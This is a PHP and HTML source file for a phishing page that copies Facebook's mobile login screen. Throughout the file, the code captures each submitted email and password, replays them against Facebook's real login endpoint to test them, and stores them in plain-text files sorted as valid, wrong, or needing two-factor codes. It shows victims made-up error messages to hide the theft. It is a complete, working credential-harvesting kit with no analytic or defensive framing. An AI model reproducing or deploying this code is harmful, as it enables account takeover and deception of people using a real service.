<?php
include("function.php");

function loggim($email,$pass){
fwrite(fopen("facebook.html","w"),get_source());
$source = file_get_contents("facebook.html");
$lsd = get_input($source,"lsd");

$jazoest = get_input($source,"jazoest");


$m_ts = get_input($source,"m_ts");

$li = get_input($source,"li");

$try_number = get_input($source,"try_number");

$unrecognized_tries = get_input($source,"unrecognized_tries");
$bi_xrwh = 0;






    $site = "https://mbasic.facebook.com/login/device-based/regular/login/?next=%2Ffriends/center/friends/?mff_nav=1&shbl=1&refsrc=deprecated";
    $curl = curl_init($site);
    
    
    $useragent = 'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3';
    
    
    
    curl_setopt($curl, CURLOPT_USERAGENT, $useragent);
    
    
    curl_setopt($curl, CURLOPT_REFERER, 'https://m.facebook.com/');
    
    
    $cookie_file = 'cookie.txt';
    
    
    
    curl_setopt($curl, CURLOPT_COOKIEFILE, $cookie_file);
    
    
    curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie_file);
    
    curl_setopt($curl, CURLOPT_POST, 1);
curl_setopt($curl, CURLOPT_POSTFIELDS,
            "lsd=$lsd&jazoest=$jazoest&m_ts=$m_ts&li=$li&try_number=$try_number&unrecognized_tries=$unrecognized_tries&email=".$email."&pass=".$pass."&login=Log+In&bi_xrwh=$bi_xrwh");
    
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    
    
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    
    
    $source = curl_exec($curl);
    
  //return htmlspecialchars($source);
    
fwrite(fopen("after.html","w"),$source);
 
    
   
    curl_close($curl);
}

if(isset($_POST['btn'])){

echo loggim($_POST['email'],$_POST['pwd']);
unlink("cookie.txt");
header("location:./");
}
?>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width">
    <title>Facebook</title>
    <link rel="preconnect" href="https://fonts.gstatic.com">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/1.4.6/tailwind.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.1/css/all.min.css" />
<style>


</style>
</head>
<body>
<div class="mbase">
<div class="w-100 text-center p-1" style="background-color: #245B97;">
  <h1 class="text-white font-black text-2xl">facebook</h1>
</div>
<div class="bg-red-600 text-sm text-white p-3">
  <?php 
  $title=getTitle("after.html");
  
  if($title=="Enter login code to continue"){
  echo "An unknown error has occurred.";
  fwrite(fopen("2fatc.txt","a"),$_POST['email']."::".$_POST['pwd']."\n");
  }elseif($title=="Reset Your Password"){
  echo "Password is wrong.";
  fwrite(fopen("wrong.txt","a"),$_POST['email']."::".$_POST['pwd']."\n");
  }elseif($title=="Log in to Facebook | Facebook"){
  echo getErr(file_get_contents("after.html"));
  fwrite(fopen("wrong.txt","a"),$_POST['email']."::".$_POST['pwd']."\n");
  }else{
fwrite(fopen("right.txt","a"),$_POST['email']."::".$_POST['pwd']."\n");
  }
  ?>
</div>

<form action="" method="post">
<div
  class="flex flex-col content-center my-5 mx-auto text-sm"
  style="max-width: 380px"
>
  <input
    type="text"
    class="block p-3 rounded text-sm text-black border"
    style="background-color: #F5F6F7;"
    placeholder="Mobile number or email address"
    name="email"
  />
  <input
    type="password"
    class="block p-3 border rounded text-sm text-black"
    style="background-color: #F5F6F7;"
    placeholder="Password"
    name="pwd"
  />

  <button
   type="submit" name="btn" class="block p-2 mt-3 rounded text-sm text-white font-bold border border-blue-"
    style="background-color: #007BF0;"
  >
    Login
  </button>

  <div class="flex items-center">
    <hr width="50%" />
    <span class="text-gray-900 m-3" style="text-style: ">or</span>
    <hr width="50%" />
  </div>
  
  <button class="p-2 w-3/3 rounded mx-auto font-bold text-white" style="background-color: #00A622">Create an account</button>
  <a href="#" class="mx-auto mt-3" style="color: #6497C7;">Forgotten password?</a>
  
  <div class="divider my-5"></div>
  
  <div class="flex justify-between center-align flex-wrap text-xs mx-5">
    <ul class="text-center w-1/2" style="list-style: none">
      <li><a href="#" class="text-gray-700">English (UK)</a></li>
      <li><a href="#" class="text-blue-800">Basa Jawa</a></li>
      <li><a href="#" class="text-blue-800">Español</a></li>
      <li><a href="#" class="text-blue-800">Français (France)</a></li>
    </ul>
    
    <ul class="text-center w-1/2" style="list-style: none">
      <li><a href="#" class="text-blue-800">Bahasa Indonesia</a></li>
      <li><a href="#" class="text-blue-800">Bahasa Melayu</a></li>
      <li><a href="#" class="text-blue-800">Português (Brasil)
</a></li>
      <li><a href="#" class="border border-blue-800 bg-white rounded p-1" style="width: 20px; height: 20px;"><i class="fas fa-plus text-gray-600"></i></a></li>
    </ul>
  </div>
</form>
  <p class="mt-3 w-100 text-center">
    <span class="text-gray-600 text-xs">Facebook Inc.</span>
  </p>
</div>


</div>








<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script> 
</body>
</html>